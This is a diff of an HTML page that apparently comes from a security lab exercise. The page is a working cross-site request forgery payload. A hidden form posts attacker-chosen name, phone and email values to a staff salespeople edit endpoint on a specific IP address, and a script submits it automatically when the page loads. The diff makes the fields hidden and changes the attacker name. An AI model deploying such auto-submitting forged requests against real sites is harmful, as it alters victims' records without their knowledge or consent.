@@ -7,17 +7,16 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
 </head>
-    <h1>1</h1>
+    <h1>2</h1>
     <body>
     <form name="csrfForm" action="https://104.198.208.81/red/public/staff/salespeople/edit.php?id=1" method="POST">
-        <input type="text" name="first_name" value="Trudy">
-        <input type="text" name="last_name" value="Hacker">
-        <input type="text" name="phone" value="6666666666">
-        <input type="text" name="email" value="hacker@gmail.com">
+        <input type="hidden" name="first_name" value="Bob">
+        <input type="hidden" name="last_name" value="Hacker">
+        <input type="hidden" name="phone" value="6666666666">
+        <input type="hidden" name="email" value="hacker@gmail.com">
     </form>
     <script>
         document.csrfForm.submit();
     </script>
-    <iframe name="hidden_results" style="display: none;"></iframe>
 </body>
 </html>
